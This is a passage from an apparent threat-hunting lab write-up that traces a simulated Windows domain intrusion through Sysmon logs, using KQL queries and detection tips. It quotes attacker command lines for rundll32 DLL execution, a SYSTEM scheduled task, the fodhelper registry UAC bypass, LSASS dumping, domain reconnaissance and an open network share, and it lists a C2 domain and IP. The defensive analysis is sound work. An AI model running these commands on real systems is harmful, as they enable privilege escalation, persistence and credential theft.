Search for `rundll32.exe` executions and inspect the DLL path. Focus on non-system directories and uncommon drive letters. Pivot to parent processes like `explorer.exe` to identify user-triggered execution and trace the initial infection vector.

</details>

---

<details>
<summary id="-flag-11">🚩 <strong>Flag 11: <Technique Name></strong></summary>

### 🎯 Objective
Execute malicious code from a mounted disk image to bypass security controls and establish initial access.

### 📌 Finding
The malicious DLL (`review.dll`) was executed from the `D:` drive using `rundll32.exe`, indicating the file originated from a mounted disk image (e.g., ISO/IMG/VHD) rather than the local filesystem.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | EC2AMAZ-B9GHHO6.emberforge.local |
| Timestamp | 2026-01-30 21:27:03.337 UTC |
| Process | rundll32.exe |
| Parent Process | explorer.exe |
| Command Line | "C:\Windows\System32\rundll32.exe" D:\review.dll,StartW |

### 💡 Why it matters
Execution from a non-standard drive (`D:`) strongly suggests the use of a mounted disk image, a common technique to bypass Windows security mechanisms such as Mark-of-the-Web protections. This allows malicious files to appear more trusted and increases the likelihood of successful execution by the user. It highlights a stealthy initial access vector that can evade traditional file-based defenses.


### 🔧 KQL Query Used
EmberForgeX_CL
| extend Utc = todatetime(column_ifexists("UtcTime_s", ""))
| extend ProcCmd = coalesce(tostring(column_ifexists("CommandLine_s", "")), tostring(column_ifexists("ProcCmd", "")))
| extend ProcImage = coalesce(tostring(column_ifexists("Image_s", "")), tostring(column_ifexists("ProcImage", "")), tostring(column_ifexists("NewProcessName_s", "")))
| extend Evt = tostring(column_ifexists("EventCode_s", ""))
| where Utc between (datetime(2026-01-30 21:00:00) .. datetime(2026-01-31 00:00:00))
| where isempty(Evt) or Evt in ("1", "4688")
| where ProcCmd has "Desktop" or ProcImage has_any ("control.exe", "rundll32.exe", "mshta.exe", "regsvr32.exe", "wscript.exe", "cscript.exe")
| project Utc, Computer, ProcImage, ProcCmd
| order by Utc asc

### 🖼️ Screenshot
<img width="906" height="260" alt="image" src="https://github.com/user-attachments/assets/ac3ac2a4-421a-42ea-8c3c-2b2656516264" />

### 🛠️ Detection Recommendation
Monitor for execution of processes from non-system drives (e.g., `D:\`, `E:\`) and alert on `rundll32.exe` loading DLLs from removable or mounted media. Enable logging for disk mount events and correlate with subsequent process execution.

**Hunting Tip:**  
Search for processes executing from drive letters other than `C:` and investigate associated file origins. Look for patterns involving mounted ISO or VHD files followed by execution of binaries or DLLs, especially via LOLBins like `rundll32.exe`.

</details>

---

<details>
<summary id="-flag-12">🚩 <strong>Flag 12: <Technique Name></strong></summary>

### 🎯 Objective
Execute the initial malicious payload via a user account to establish a foothold in the environment.

### 📌 Finding
The malicious DLL (`review.dll`) was executed using `rundll32.exe` under the user account `lmartin`, identifying this user as patient zero in the compromise.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | EC2AMAZ-B9GHHO6.emberforge.local |
| Timestamp | 2026-01-30 21:27:03.300 UTC |
| Process | rundll32.exe |
| Parent Process | explorer.exe |
| Command Line | "C:\Windows\System32\rundll32.exe" D:\review.dll,StartW |

### 💡 Why it matters
Identifying `lmartin` as the user who executed the payload pinpoints the initial point of compromise (patient zero). This is critical for scoping the incident, understanding how the attack began (likely user interaction), and determining what access the attacker gained. It also informs containment actions such as isolating the user account, resetting credentials, and reviewing related activity.

### 🔧 KQL Query Used
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:27:00) .. datetime(2026-01-30 21:27:10))
| where Computer == "EC2AMAZ-B9GHHO6.emberforge.local"
| where CommandLine_s contains "rundll32.exe"
| where CommandLine_s contains "review.dll"
| project UtcTime_s, Computer, CommandLine_s, User_s

### 🖼️ Screenshot
<img width="1622" height="694" alt="image" src="https://github.com/user-attachments/assets/d55b5e10-1130-448b-a1d8-f71e0ba01284" />

### 🛠️ Detection Recommendation
Enable auditing of process creation with user context and alert on suspicious executions (e.g., `rundll32.exe` loading DLLs from non-standard paths) tied to specific user accounts. Monitor for unusual activity originating from user endpoints, especially involving mounted drives or external media.

**Hunting Tip:**  
Pivot on the `User` field in process creation logs to identify the first user associated with malicious activity. Trace all subsequent actions tied to that account to understand the full attack path and potential lateral movement.

</details>

---

<details>
<summary id="-flag-13">🚩 <strong>Flag 13: <Technique Name></strong></summary>

### 🎯 Objective
Execute a malicious payload by leveraging a trusted Windows utility (`rundll32.exe`) to load and run a rogue DLL (`review.dll`), likely for stealthy code execution and potential persistence or follow-on actions.

### 📌 Finding
A suspicious DLL (`review.dll`) was executed via `rundll32.exe`, a legitimate Windows binary commonly abused for proxy execution. The process was initiated from a user-driven parent process, indicating initial user interaction (patient zero) leading to execution.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | <Affected Host - e.g., WIN-XXXX> |
| Timestamp | <Execution Time from Event Logs> |
| Process | rundll32.exe |
| Parent Process | explorer.exe |
| Command Line | "C:\Windows\System32\rundll32.exe" D:\review.dll,StartW |

### 💡 Why it matters
This activity reflects **Living Off the Land (LOLBins)** behavior, where attackers abuse legitimate system binaries to evade detection. `rundll32.exe` is trusted and often bypasses traditional security controls, making it an effective tool for executing malicious DLLs.  

The presence of a DLL executed from a non-standard directory (`D:\`) is highly suspicious and suggests:  
- Initial compromise via user interaction (e.g., download, USB, or phishing)  
- Potential execution of arbitrary attacker-controlled code  
- Increased risk of persistence, lateral movement, or data exfiltration  


### 🔧 KQL Query Used
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:27:00) .. datetime(2026-01-30 21:27:10))
| where Computer == "EC2AMAZ-B9GHHO6.emberforge.local"
| where CommandLine_s contains "rundll32.exe"
| where CommandLine_s contains "review.dll"
| project UtcTime_s, Computer, CommandLine_s, User_s

### 🖼️ Screenshot
<img width="992" height="58" alt="image" src="https://github.com/user-attachments/assets/0cb8f698-9588-44a0-8bd3-c2dcd13f1006" />

### 🛠️ Detection Recommendation
Identify and alert on abuse of legitimate Windows binaries (like rundll32.exe) executing suspicious or non-standard payloads.

**Hunting Tip:**  
Search for anomalous `rundll32.exe` executions, especially:  
- DLLs executed from non-system paths (e.g., `D:\`, `Downloads`, `Temp`)  
- Uncommon or non-standard exported functions (e.g., `StartW`)  
- Parent-child chains involving `explorer.exe` → `rundll32.exe`  

</details>

---

<details>
<summary id="-flag-14">🚩 <strong>Flag 14: <Technique Name></strong></summary>

### 🎯 Objective
Deliver and stage the malicious payload by extracting a downloaded archive into the user’s profile for execution.

### 📌 Finding
The user opened a downloaded archive, which was extracted using `7zG.exe` into a folder within the Downloads directory. This step staged the malicious DLL (`review.dll`) prior to execution via `rundll32.exe`.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | EC2AMAZ-B9GHHO6.emberforge.local |
| Timestamp | 2026-01-30 21:24:04.656 UTC |
| Process | 7zG.exe |
| Parent Process | explorer.exe |
| Command Line | "C:\Program Files\7-Zip\7zG.exe" x -o"C:\Users\lmartin.EMBERFORGE\Downloads\EmberForge_Review\" ... |

### 💡 Why it matters
This shows the critical staging phase before execution, where the attacker relied on user interaction to extract malicious content. By placing files in a trusted user directory (Downloads), the attacker increases the likelihood of execution and reduces suspicion. This step directly enabled the subsequent DLL execution and marks a key transition from delivery to execution in the attack chain.

### 🔧 KQL Query Used
EmberForgeX_CL
| where Computer == "EC2AMAZ-B9GHHO6.emberforge.local"
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:15:00) .. datetime(2026-01-30 21:27:03))
| where CommandLine_s has_any ("7z", "WinRAR", "rar.exe", "7zFM.exe", "7zG.exe", "tar.exe", "Expand-Archive", ".zip", ".iso", ".img")
| project UtcTime_s, Computer, CommandLine_s
| order by todatetime(UtcTime_s) asc

### 🖼️ Screenshot
<img width="2020" height="682" alt="image" src="https://github.com/user-attachments/assets/c57395e9-7d72-4ab0-a899-f780df1d2469" />

### 🛠️ Detection Recommendation
Monitor archive extraction activity from user directories, especially Downloads, and alert on tools like `7zG.exe`, `WinRAR`, or built-in extraction utilities. Correlate archive extraction events with subsequent process executions from the same directory.

**Hunting Tip:**  
Search for archive extraction tools and pivot to the destination folder. Then investigate any executable or DLL activity from that folder within a short time window—this often reveals staged payload execution.

</details>

---

<details>
<summary id="-flag-15">🚩 <strong>Flag 15: <Technique Name></strong></summary>

### 🎯 Objective
Establish persistence and maintain long-term access by deploying a reusable payload in a writable directory.

### 📌 Finding
A malicious executable (`C:\Users\Public\update.exe`) was dropped in a world-writable directory and configured for persistence using scheduled tasks and registry modifications, becoming the attacker’s primary tool.


### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | EC2AMAZ-B9GHHO6.emberforge.local |
| Timestamp | 2026-01-30 21:37:16.145 UTC |
| Process | schtasks.exe |
| Parent Process | cmd.exe |
| Command Line | schtasks /create /tn WindowsUpdate /tr C:\Users\Public\update.exe /sc onstart /ru system |

### 💡 Why it matters
Placing `update.exe` in `C:\Users\Public` (a world-writable directory) allows easy access and execution while avoiding suspicion. The attacker ensured persistence via scheduled tasks and registry keys, enabling the payload to run on startup or user logon. This establishes a durable foothold, allowing continued access, lateral movement, and execution of further malicious actions.

### 🔧 KQL Query Used
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:27:00) .. datetime(2026-01-30 22:00:00))
| where Computer == "EC2AMAZ-B9GHHO6.emberforge.local"
| where CommandLine_s contains "C:\\Users\\Public\\"
| project UtcTime=todatetime(UtcTime_s), CommandLine_s
| order by UtcTime asc

### 🖼️ Screenshot
<img width="1730" height="978" alt="image" src="https://github.com/user-attachments/assets/c6285756-772e-4655-b346-97c88796d3f6" />

### 🛠️ Detection Recommendation
Monitor for executables created or executed from world-writable directories like `C:\Users\Public`. Alert on persistence mechanisms such as `schtasks` creation and suspicious registry modifications. Correlate file creation events with subsequent persistence activity.

**Hunting Tip:**  
Search for processes executing from `C:\Users\Public` or similar directories and pivot to persistence mechanisms like scheduled tasks or registry run keys. Look for newly created executables followed by immediate configuration for autorun.

</details>

---

<details>
<summary id="-flag-16">🚩 <strong>Flag 16: <Technique Name></strong></summary>

### 🎯 Objective
Establish command-and-control (C2) communication with attacker-controlled infrastructure to receive instructions and maintain access.

### 📌 Finding
The compromised host made repeated DNS queries to the domain `cdn.cloud-endpoint.net`, indicating it was used as attacker-controlled infrastructure designed to blend in with legitimate cloud traffic.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | EC2AMAZ-B9GHHO6.emberforge.local |
| Timestamp | 2026-01-30 21:XX:XX UTC |
| Process | update.exe (likely) |
| Parent Process | cmd.exe / scheduled task |
| Command Line | N/A (DNS query observed via Sysmon EventCode 22) |

### 💡 Why it matters
This identifies active communication between the compromised system and attacker infrastructure. The domain `cdn.cloud-endpoint.net` is crafted to appear legitimate, helping evade detection. DNS-based communication is commonly used for command-and-control, enabling attackers to issue commands, maintain persistence, and exfiltrate data while blending into normal network traffic.

### 🔧 KQL Query Used
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00:00) .. datetime(2026-01-31 00:00:00))
| where EventCode_s == "22"
| project UtcTime=todatetime(UtcTime_s), Computer, Image_s, QueryName_s
| where isnotempty(QueryName_s)
| summarize count() by QueryName_s
| order by count_ desc

### 🖼️ Screenshot
<img width="1318" height="708" alt="image" src="https://github.com/user-attachments/assets/e4b32248-b2de-4e40-8981-0a3f930586b7" />

### 🛠️ Detection Recommendation
Enable and monitor DNS logging (e.g., Sysmon Event ID 22) and alert on suspicious or newly observed domains, especially those mimicking legitimate cloud services. Implement threat intelligence feeds to block known malicious domains and monitor for repeated queries to uncommon domains.


**Hunting Tip:**  
Aggregate DNS queries and look for domains with high frequency across hosts that do not match known legitimate services. Pay attention to domains that resemble cloud or CDN providers but are not officially recognized—these are often used for stealthy C2 communication.

</details>

---

<details>
<summary id="-flag-17">🚩 <strong>Flag 17: <Technique Name></strong></summary>

### 🎯 Objective
Resolve attacker-controlled domains to IP addresses to enable outbound communication for command-and-control (C2) and data exfiltration.

### 📌 Finding
DNS queries to `cdn.cloud-endpoint.net` were resolved to the IP address `104.21.30.237`, confirming the infrastructure used by the attacker for communication.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | EC2AMAZ-B9GHHO6.emberforge.local |
| Timestamp | 2026-01-30 21:XX:XX UTC |
| Process | update.exe (likely) |
| Parent Process | schtasks.exe / cmd.exe |
| Command Line | N/A (DNS resolution observed via Sysmon EventCode 22 Raw_s parsing) |

### 💡 Why it matters
Resolving the malicious domain to a concrete IP (`104.21.30.237`) provides a high-confidence indicator of compromise that can be used for blocking and threat intelligence. It bridges the gap between DNS-based detection and network-level controls, allowing defenders to identify and stop active communication with attacker infrastructure. This is critical for containment and preventing further command-and-control activity.

### 🔧 KQL Query Used
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00:00) .. datetime(2026-01-31 00:00:00))
| where Image_s == @"C:\Windows\System32\rundll32.exe" or Image_s == @"C:\Users\Public\update.exe"
| summarize count() by DestinationIp_s
| order by count_ desc

### 🖼️ Screenshot
<img width="1756" height="710" alt="image" src="https://github.com/user-attachments/assets/76d84ea5-ecc2-45e7-acef-cf08e041d318" />

### 🛠️ Detection Recommendation
Parse and monitor Sysmon Event ID 22 (`Raw_s`) to extract resolved IP addresses and correlate them with suspicious domains. Block known malicious IPs at the network perimeter and integrate threat intelligence feeds to detect connections to attacker infrastructure.

**Hunting Tip:**  
When investigating DNS activity, don’t stop at the domain—parse the `QueryResults` field to uncover resolved IPs. Pivot from domains to IPs and look for repeated connections or high-volume traffic to identify active C2 channels.

</details>

---

<details>
<summary id="-flag-18">🚩 <strong>Flag 18: <Technique Name></strong></summary>

### 🎯 Objective
Evade detection by injecting malicious code into a legitimate process to blend in with normal system activity.

### 📌 Finding
The attacker used `rundll32.exe` to inject code into `notepad.exe`, indicating process injection via CreateRemoteThread (Sysmon Event ID 8).

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | EC2AMAZ-B9GHHO6.emberforge.local |
| Timestamp | 2026-01-30 21:32:42.708 UTC |
| Process | rundll32.exe |
| Parent Process | explorer.exe |
| Command Line | "C:\Windows\System32\rundll32.exe" D:\review.dll,StartW |

### 💡 Why it matters
Process injection allows attackers to hide malicious activity inside trusted processes like `notepad.exe`, making detection significantly harder. This technique enables stealthy execution, persistence, and potential privilege escalation while bypassing traditional security tools that rely on process-based detection.


### 🔧 KQL Query Used
EmberForgeX_CL
| where EventCode_s == "8"
| where Computer contains "B9GHHO6"
| parse Raw_s with * "SourceImage'>" SourceImage "<" *
| parse Raw_s with * "TargetImage'>" TargetImage "<" *
| parse Raw_s with * "SourceUser'>" SourceUser "<" *
| project UtcTime_s, SourceImage, TargetImage, SourceUser
| sort by UtcTime_s asc

### 🖼️ Screenshot
<img width="1668" height="854" alt="image" src="https://github.com/user-attachments/assets/005ae479-034c-4b0a-9c65-cca5955c4132" />

### 🛠️ Detection Recommendation
Monitor Sysmon Event ID 8 (CreateRemoteThread) and alert on unusual source-to-target process relationships, especially when system utilities like `rundll32.exe` inject into benign applications. Correlate with prior suspicious execution activity and user context.

**Hunting Tip:**  
Look for uncommon parent-child or injection relationships (e.g., `rundll32.exe` → `notepad.exe`). Pivot on Event ID 8 and investigate processes that do not normally interact, especially when tied to earlier malicious execution or user-triggered events.

</details>

---

<details>
<summary id="-flag-19">🚩 <strong>Flag 19: <Technique Name></strong></summary>

### 🎯 Objective
Bypass User Account Control (UAC) to execute malicious code with elevated privileges without triggering a prompt.

### 📌 Finding
The attacker modified the `ms-settings` registry key and then executed `fodhelper.exe`, a trusted auto-elevating binary, to achieve privilege escalation.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | EC2AMAZ-B9GHHO6.emberforge.local |
| Timestamp | 2026-01-30 21:38:33.745 UTC (registry) / 2026-01-30 21:39:02.511 UTC (execution) |
| Process | fodhelper.exe |
| Parent Process | rundll32.exe |
| Command Line | fodhelper.exe |

### 💡 Why it matters
This is a well-known UAC bypass technique that abuses trusted Windows binaries to execute attacker-controlled code with elevated privileges. By modifying the `ms-settings` registry path, the attacker redirects execution flow, allowing privilege escalation without user interaction. This enables further actions such as credential dumping, persistence, and lateral movement.

### 🔧 KQL Query Used
EmberForgeX_CL
| where EventCode_s == "13"
| where TargetObject_s contains "ms-settings"
| project UtcTime_s, Computer, User_s, Image_s, TargetObject_s
| sort by UtcTime_s asc

EmberForgeX_CL
| where EventCode_s == "1"
| where Image_s contains "fodhelper" or ParentImage_s contains "fodhelper"
| project UtcTime_s, Computer, User_s, Image_s, CommandLine_s, ParentImage_s
| sort by UtcTime_s asc

### 🖼️ Screenshot

<img width="2298" height="714" alt="image" src="https://github.com/user-attachments/assets/7315fb8e-1959-43e2-bac2-3e194b0ecd32" />

<img width="2214" height="758" alt="image" src="https://github.com/user-attachments/assets/f036d824-e926-4736-ba55-7b5d2ac12a14" />

### 🛠️ Detection Recommendation
Monitor for registry modifications to `HKCU\Software\Classes\ms-settings\shell\open\command` followed by execution of `fodhelper.exe`. Alert on suspicious parent-child relationships involving auto-elevating binaries and correlate with recent registry changes.

**Hunting Tip:**  
Hunt for sequences: **Registry modification (Event ID 13)** → **Trusted binary execution (Event ID 1)** within a short timeframe. This chaining behavior is a strong indicator of UAC bypass activity.

</details>

---

<details>
<summary id="-flag-20">🚩 <strong>Flag 20: <Technique Name></strong></summary>

### 🎯 Objective
Enable a UAC bypass by configuring the registry to hijack a trusted auto-elevating binary’s execution flow.

### 📌 Finding
The attacker created the `DelegateExecute` registry value under the `ms-settings` key, enabling the hijack used by `fodhelper.exe` to execute malicious code with elevated privileges.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | EC2AMAZ-B9GHHO6.emberforge.local |
| Timestamp | 2026-01-30 21:38:50.904 UTC |
| Process | reg.exe |
| Parent Process | rundll32.exe |
| Command Line | reg add HKCU\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /t REG_SZ /d "" /f |

### 💡 Why it matters
The `DelegateExecute` value is the key component that enables this UAC bypass technique. When present, it causes `fodhelper.exe` to execute without prompting the user and follow the attacker-controlled registry path. This allows silent privilege escalation, giving the attacker elevated execution without user awareness.

### 🔧 KQL Query Used
EmberForgeX_CL
| where EventCode_s == "13"
| where TargetObject_s contains "ms-settings"
| project UtcTime_s, Computer, User_s, Image_s, TargetObject_s
| sort by UtcTime_s asc

### 🖼️ Screenshot
<img width="2268" height="930" alt="image" src="https://github.com/user-attachments/assets/c70201d0-87ca-4c05-b15b-351ccbd681ae" />

### 🛠️ Detection Recommendation
Monitor for creation or modification of the `DelegateExecute` value under `HKCU\Software\Classes\ms-settings\shell\open\command`. Alert when followed by execution of `fodhelper.exe` or other auto-elevating binaries. Correlate registry changes with process execution timing.

**Hunting Tip:**  
Hunt for registry writes to `ms-settings` keys, especially `DelegateExecute`, and immediately pivot to subsequent process execution events. This sequence is a strong indicator of UAC bypass activity.

</details>

---

<details>
<summary id="-flag-21">🚩 <strong>Flag 21: <Technique Name></strong></summary>

### 🎯 Objective
Achieve stable, privileged persistence by injecting malicious code into a SYSTEM-level process for long-term execution and stealth.

### 📌 Finding
The attacker used `update.exe` to inject code into `spoolsv.exe`, a SYSTEM-level process, allowing execution under the `NT AUTHORITY\SYSTEM` context.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | EC2AMAZ-B9GHHO6.emberforge.local |
| Timestamp | 2026-01-30 21:56:44.706 UTC |
| Process | update.exe |
| Parent Process | fodhelper.exe / elevated context |
| Command Line | N/A (injection observed via Sysmon EventCode 8) |

### 💡 Why it matters
Injecting into `spoolsv.exe` provides the attacker with execution inside a trusted Windows service running as SYSTEM, the highest privilege level on the host. This ensures persistence, evasion, and resilience—even if the original malicious process is terminated. It also allows the attacker to perform sensitive operations such as credential access, lateral movement, and system manipulation without raising immediate suspicion.

### 🔧 KQL Query Used
EmberForgeX_CL
| where EventCode_s == "8"
| where Computer contains "EC2AMAZ-B9GHHO6"
| where Raw_s contains "update.exe" or Raw_s contains "spoolsv"
| parse Raw_s with * "SourceImage'>" SourceImage "<" *
| parse Raw_s with * "TargetImage'>" TargetImage "<" *
| parse Raw_s with * "TargetUser'>" TargetUser "<" *
| project UtcTime_s, Computer, SourceImage, TargetImage, TargetUser
| sort by UtcTime_s asc

### 🖼️ Screenshot
<img width="2158" height="858" alt="image" src="https://github.com/user-attachments/assets/2733616f-1175-4b00-b481-90d031433b00" />

### 🛠️ Detection Recommendation
Monitor Sysmon Event ID 8 (CreateRemoteThread) for injections into SYSTEM-level processes like `spoolsv.exe`, `lsass.exe`, or `svchost.exe`. Alert on unusual source processes (e.g., user-space executables like `update.exe`) injecting into privileged services. Correlate with prior privilege escalation activity.

**Hunting Tip:**  
Focus on cross-context injections—where a user-level process injects into a SYSTEM-level process. This jump in privilege context is a strong indicator of post-exploitation activity and often signals transition to persistence or full system control.

</details>

---

<details>
<summary id="-flag-22">🚩 <strong>Flag 22: <Technique Name></strong></summary>

### 🎯 Objective
Harvest credentials by dumping LSASS memory to extract plaintext passwords, hashes, and authentication tokens.

### 📌 Finding
The attacker used `update.exe` to create an LSASS memory dump file (`lsass.dmp`) in `C:\Windows\System32`, indicating credential dumping activity using direct syscalls to evade detection.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | EC2AMAZ-B9GHHO6.emberforge.local |
| Timestamp | 2026-01-30 21:48:13.933 UTC |
| Process | update.exe |
| Parent Process | schtasks.exe / cmd.exe |
| Command Line | N/A (file creation observed via Sysmon EventCode 11) |

### 💡 Why it matters
LSASS contains sensitive credential material for all logged-in users. Dumping it allows attackers to extract passwords, NTLM hashes, and Kerberos tickets, enabling lateral movement and privilege escalation. The use of direct syscalls bypasses traditional API-based detection, making this a stealthy and high-impact credential access technique.

### 🔧 KQL Query Used
EmberForgeX_CL
| where EventCode_s == "11"
| where TargetFilename_s contains ".dmp"
| project UtcTime_s, Image_s, TargetFilename_s

### 🖼️ Screenshot
<img width="1284" height="682" alt="image" src="https://github.com/user-attachments/assets/bd5b3f23-73cc-451a-bc52-c2004926c347" />

### 🛠️ Detection Recommendation
Monitor for creation of `.dmp` files in sensitive directories like `C:\Windows\System32`, especially `lsass.dmp`. Alert on non-standard processes (e.g., not `procdump.exe`, `taskmgr.exe`) interacting with LSASS. Use behavioral detection (file creation + process context) rather than relying solely on API-based monitoring.

**Hunting Tip:**  
Search for Sysmon Event ID 11 (FileCreate) with filenames like `lsass.dmp`. Pivot to the creating process and investigate its origin, execution path, and related activity to identify credential dumping attempts.

</details>

---

<details>
<summary id="-flag-23">🚩 <strong>Flag 23: <Technique Name></strong></summary>

### 🎯 Objective
Persist credential material by writing LSASS memory contents to disk for offline extraction and reuse.

### 📌 Finding
The attacker used `update.exe` to create a credential dump file at `C:\Windows\System32\lsass.dmp`, capturing LSASS memory to disk.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | EC2AMAZ-B9GHHO6.emberforge.local |
| Timestamp | 2026-01-30 21:48:13.892 UTC |
| Process | update.exe |
| Parent Process | schtasks.exe / cmd.exe |
| Command Line | N/A (FileCreate observed via Sysmon EventCode 11) |

### 💡 Why it matters
Writing an LSASS dump to `System32` indicates high-privilege access and enables offline credential extraction (passwords, NTLM hashes, Kerberos tickets). This facilitates lateral movement and privilege escalation. The location and method suggest deliberate evasion (direct syscalls), making this a high-confidence, high-impact indicator of compromise.

### 🔧 KQL Query Used
EmberForgeX_CL
| where EventCode_s == "11"
| where TargetFilename_s has_any (".dmp", "lsass", "dump")
| project UtcTime_s, Computer, Image_s, TargetFilename_s
| order by todatetime(UtcTime_s) asc

### 🖼️ Screenshot
<img width="1674" height="752" alt="image" src="https://github.com/user-attachments/assets/58ca93bf-82c7-4bcc-98ba-66c5b5551b90" />

### 🛠️ Detection Recommendation
Alert on creation of files named `lsass*.dmp` or any `.dmp` in sensitive paths (e.g., `C:\Windows\System32`). Correlate with the creating process and flag non-standard dump tools (anything other than `procdump.exe`, `taskmgr.exe`). Enforce EDR rules for LSASS access and block unsigned binaries writing dumps.

**Hunting Tip:**  
Hunt Sysmon Event ID 11 for `.dmp` files, then pivot to the creating process and its execution chain. Combine with absence of Event ID 10 (ProcessAccess) to spot syscall-based dumpers that bypass typical LSASS access telemetry.

</details>

---

<details>
<summary id="-flag-24">🚩 <strong>Flag 24: <Technique Name></strong></summary>

### 🎯 Objective
Enumerate domain user accounts to understand the environment and identify potential targets for lateral movement or privilege escalation.

### 📌 Finding
The attacker executed `net user /domain` to query all user accounts in the domain, indicating active reconnaissance of Active Directory.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | EC2AMAZ-B9GHHO6.emberforge.local |
| Timestamp | 2026-01-30 21:34:32.951 UTC |
| Process | net.exe |
| Parent Process | rundll32.exe |
| Command Line | net user /domain |

### 💡 Why it matters
Enumerating domain users is a key discovery step that allows attackers to map the environment, identify privileged accounts, and plan further actions such as credential theft or lateral movement. This activity often precedes targeted attacks against high-value accounts like Domain Admins.

### 🔧 KQL Query Used
EmberForgeX_CL
| where EventCode_s == "1"
| where Computer contains "EC2AMAZ-B9GHHO6"
| where CommandLine_s has_any ("net user", "Get-ADUser", "dsquery user", "wmic useraccount")
| project UtcTime_s, Computer, User_s, Image_s, CommandLine_s, ParentImage_s
| sort by UtcTime_s asc

### 🖼️ Screenshot
<img width="2308" height="890" alt="image" src="https://github.com/user-attachments/assets/597abba0-fc1d-420c-87cb-54249fe3370c" />

### 🛠️ Detection Recommendation
Monitor for execution of account enumeration commands such as `net user /domain`, `dsquery user`, and `Get-ADUser`, especially when executed from non-administrative workstations or unusual parent processes. Correlate with other discovery or post-exploitation activity.

**Hunting Tip:**  
Look for bursts of enumeration commands early in an attack chain. Pivot from these commands to identify what accounts were targeted next—this often reveals the attacker’s intent and next move.

</details>

---

<details>
<summary id="-flag-25">🚩 <strong>Flag 25: <Technique Name></strong></summary>

### 🎯 Objective
Identify high-privilege accounts by enumerating members of the Domain Admins group to target for escalation or lateral movement.

### 📌 Finding
The attacker executed `net group "Domain Admins" /domain` to list all users with Domain Admin privileges, indicating targeted reconnaissance of privileged accounts.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | EC2AMAZ-B9GHHO6.emberforge.local |
| Timestamp | 2026-01-30 21:34:44.359 UTC |
| Process | net.exe |
| Parent Process | rundll32.exe |
| Command Line | net group "Domain Admins" /domain |

### 💡 Why it matters
Domain Admin accounts have the highest level of control in an Active Directory environment. By identifying these users, the attacker can focus efforts on credential theft, privilege escalation, or lateral movement to achieve full domain compromise. This step is a strong indicator of intent to escalate privileges beyond the initial foothold.

### 🔧 KQL Query Used
EmberForgeX_CL
| where EventCode_s == "1"
| where Computer contains "EC2AMAZ-B9GHHO6"
| where CommandLine_s contains "Domain Admins" or CommandLine_s contains "net group"
| project UtcTime_s, Computer, User_s, Image_s, CommandLine_s
| sort by UtcTime_s asc

### 🖼️ Screenshot
<img width="2268" height="836" alt="image" src="https://github.com/user-attachments/assets/c5c9773d-db5f-4ae7-9ee7-ba97a1020a72" />

### 🛠️ Detection Recommendation
Monitor for group enumeration commands such as `net group "Domain Admins" /domain`, `Get-ADGroupMember`, or `dsquery group`. Alert when executed from user workstations or unusual parent processes, and correlate with prior discovery or credential access activity.

**Hunting Tip:**  
Track sequences of discovery: user enumeration → privileged group enumeration → credential access. This progression often reveals an attacker moving methodically toward domain dominance.

</details>

---

<details>
<summary id="-flag-26">🚩 <strong>Flag 26: <Technique Name></strong></summary>

### 🎯 Objective
Identify Domain Controllers within the environment to target for lateral movement and potential domain takeover.

### 📌 Finding
The attacker executed `nltest /dclist:emberforge.local` to enumerate all Domain Controllers in the domain, indicating reconnaissance of critical infrastructure.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | EC2AMAZ-B9GHHO6.emberforge.local |
| Timestamp | 2026-01-30 21:35:07.115 UTC |
| Process | nltest.exe |
| Parent Process | rundll32.exe |
| Command Line | nltest /dclist:emberforge.local |

### 💡 Why it matters
Domain Controllers are the backbone of Active Directory and store authentication services, policies, and credentials. By identifying these systems, the attacker is preparing for high-impact actions such as credential dumping (e.g., NTDS.dit extraction), privilege escalation, or full domain compromise. This step signals movement toward enterprise-wide control.

### 🔧 KQL Query Used
EmberForgeX_CL
| where EventCode_s == "1"
| where Computer contains "EC2AMAZ-B9GHHO6"
| where CommandLine_s has_any ("nltest", "net group \"Domain Controllers\"", "dsquery", "nslookup", "ping", "tracert", "netdom")
| project UtcTime_s, Computer, User_s, Image_s, CommandLine_s
| sort by UtcTime_s asc

### 🖼️ Screenshot
<img width="2226" height="888" alt="image" src="https://github.com/user-attachments/assets/60553d9c-f6d1-4321-994c-ddc285083c7c" />

### 🛠️ Detection Recommendation
Monitor for execution of `nltest`, especially `/dclist` or `/domain_trusts`, on non-administrative systems. Correlate with prior discovery activity (user/group enumeration) and flag when executed by unusual parent processes (e.g., rundll32.exe).

**Hunting Tip:**  
Look for a progression pattern:  
user enumeration → privilege group enumeration → domain controller discovery.  
This sequence strongly indicates an attacker mapping the environment before lateral movement.

</details>

---

<details>
<summary id="-flag-27">🚩 <strong>Flag 27: <Technique Name></strong></summary>

### 🎯 Objective
Prepare for lateral movement by creating a network-accessible share to distribute tools and payloads across the environment.

### 📌 Finding
The attacker created a network share named `tools` pointing to `C:\Users\Public` with full access granted to everyone, turning the compromised workstation into a distribution point.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | EC2AMAZ-B9GHHO6.emberforge.local |
| Timestamp | 2026-01-30 22:51:36.903 UTC |
| Process | net.exe |
| Parent Process | cmd.exe |
| Command Line | net share tools=C:\Users\Public /grant:everyone,full |

### 💡 Why it matters
Creating a share with `everyone,full` permissions is highly suspicious and enables unrestricted access to malicious tools like `update.exe`. This facilitates lateral movement by allowing other systems or compromised accounts to easily retrieve payloads, accelerating the spread of the attack across the network.

